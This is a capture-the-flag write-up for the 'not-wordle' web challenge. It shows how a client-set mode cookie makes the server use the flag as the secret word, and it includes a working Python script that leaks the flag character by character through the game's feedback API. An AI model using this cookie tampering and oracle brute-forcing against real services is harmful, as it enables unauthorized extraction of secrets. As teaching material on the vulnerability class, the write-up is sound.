🔎 Initial Reconnaissance

The challenge presents a web application that mimics the popular word-guessing game Wordle. Upon visiting the webpage, I was greeted with a familiar interface showing a grid where players guess five-letter words.

🎯 Wordle Mechanics Reminder:

  • Green (Correct) - Letter is in the word and in the correct position
  • Yellow (Present) - Letter is in the word but in wrong position
  • Gray (Absent) - Letter is not in the word at all

However, this was "definitely not wordle" - there had to be something different. I downloaded and analyzed the handout.zip file to understand the application's internals.

🛠️ Analysis and Solution

📂 Step 1: Source Code Analysis

After extracting the handout.zip, I examined the application's source code to understand how it worked. The key findings were:

🔍 Critical Discovery - Cookie Management:

The application uses two important cookies:

  • mode - Determines the game mode
  • randomSecret - Controls which word to guess

Looking at the code, I noticed a special mode called wotd (Word of the Day). When the mode cookie is set to wotd, something interesting happens:

// Pseudo-code from source analysis
function getSecret(mode, cookies) {
    const m = (mode || cookies.mode || 'random').toLowerCase();
    if (m === 'wotd') {
        const flag = (process.env.FLAG || 'REAL_FLAG_ON_REMOTE').toLowerCase();
        return { mode: 'wotd', secret: flag };
    }
    let secret = cookies.randomSecret;
    if (!secret || !/^[a-z]{5}$/.test(secret)) {
        secret = pickRandomWord();
    }
    return { mode: 'random', secret };
}

💡 The Vulnerability: By setting the mode cookie to wotd, we can make the application use the flag as the secret word! Then we just need to "guess" it.

🔍 Step 2: API Endpoint Discovery

Next, I investigated the API endpoints. The application exposes a /api/check endpoint that accepts guesses and returns feedback:

The API returns detailed feedback for each character:

  • "correct" - Character is in the right position ✅
  • "present" - Character exists but in wrong position ⚠️
  • "absent" - Character doesn't exist in the secret ❌

🎯 Exploitation Strategy: We can leak the flag character by character! By testing each possible character at each position and checking for "correct" status, we can incrementally build the complete flag.

⚙️ Step 3: Character-by-Character Extraction

The attack works as follows:

  1. Start with the known prefix: CTF{
  2. For each unknown position, try all possible characters
  3. Check the feedback for that position
  4. If status is "correct", we found the right character!
  5. Append it to our known prefix and continue
  6. Stop when we encounter the closing brace }
Known: CTF{
Try: CTF{0, CTF{1, CTF{2, ..., CTF{a, CTF{b, ...

If feedback[4].status == "correct":
  Known += character

Repeat until: Known.endswith("}")

Since flags typically contain hexadecimal characters (0-9, a-f) plus the closing brace, we only need to test a small character set for each position.

💻 Step 4: Automated Exploitation Script

I wrote a Python script to automate the character-by-character extraction:

import requests
import string

url = "http://9f53d83e.ctf.ac.upt.ro/"
flag = "CTF{"

# Continue until we find the closing brace
while not flag.endswith("}"):
    # Try all hexadecimal digits plus closing brace
    for c in string.hexdigits + "}":
        # Make request with current guess
        r = requests.post(
            url + "api/check",
            json={'guess': flag + c},
            cookies={'mode': 'wotd', 'randomSecret': 'wotd'}
        )
        
        response = r.json()
        
        # Check if we found the complete flag
        if response['correct']:
            print(flag + c)
            exit(0)
        
        # Check if current character is correct
        current_position = len(flag)
        if response['feedback'][current_position]['status'] == "correct":
            flag += c
            break
    
    # Print progress
    print(flag)

print("Final flag:", flag)

🧠 How the Script Works

Cookie Manipulation: We set mode=wotd to force the server to use the flag as the secret word.

Character Testing: For each unknown position, we iterate through string.hexdigits (0-9, a-f, A-F) plus the closing brace.

Feedback Analysis: We examine response['feedback'][current_position]['status'] to see if our guessed character is correct.

Progressive Building: Once we find a correct character, we append it to our known prefix and move to the next position.

Termination: The loop stops when the flag ends with } or when response['correct'] is true.

🔧 Technical Deep Dive

Understanding Oracle Attacks

This challenge demonstrates a classic oracle attack (also called a side-channel attack). An oracle is any mechanism that provides information about a secret through its behavior or responses.

Oracle Query: "Is character X at position N?"
Oracle Response: "correct" / "present" / "absent"

By repeatedly querying the oracle, we can
reconstruct the entire secret bit by bit.

Why This Vulnerability Exists

The vulnerability stems from several design flaws:

  1. Client-Controlled State: The mode cookie is controlled by the client but affects critical server behavior
  2. Detailed Feedback: The API returns position-specific feedback, allowing precise extraction
  3. No Rate Limiting: Unlimited guesses enable exhaustive searching
  4. Special Admin Mode: The wotd mode uses the flag as the secret without proper authorization

🎮 The Wordle Connection

The challenge cleverly subverts the Wordle game mechanics:

Legitimate Wordle: Players have 6 attempts to guess a 5-letter word. Feedback helps narrow down possibilities but doesn't leak the exact word character by character.

not-wordle Vulnerability: Unlimited attempts + character-specific feedback = complete secret extraction. The game mechanics become an exploitation primitive!
